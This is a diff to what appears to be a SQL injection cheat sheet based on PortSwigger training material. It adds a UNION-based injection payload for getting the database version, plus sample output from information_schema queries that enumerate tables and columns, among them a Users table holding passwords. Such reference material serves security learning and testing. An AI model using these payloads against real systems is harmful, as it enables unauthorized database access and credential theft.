@@ -48,6 +48,17 @@ This [SQL injection](https://portswigger.net/web-security/sql-injection) cheat s
 | PostgreSQL | `SELECT version() `|
 | MySQL | `SELECT @@version `| 
 
+ - For example, you could use a ***UNION*** attack with the following input: 
+```sql
+' UNION SELECT @@version--
+```
+This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
+```sql
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+```
 
 ## Database contents
 *You can list the tables that exist in the database, and the columns that those tables contain.*
@@ -58,6 +69,24 @@ This [SQL injection](https://portswigger.net/web-security/sql-injection) cheat s
 | Microsoft |  `SELECT * FROM information_schema.tables` <br> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
 | PostgreSQL |  `SELECT * FROM information_schema.tables` <br> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
 | MySQL |  `SELECT * FROM information_schema.tables` <br> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+
+ With `.tables` it returns output like the following: 
+ ```sql
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+```
+
+With `.columns` and the **table name** it returns output like the following:
+```sql
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+```
 
 
 ## Conditional errors
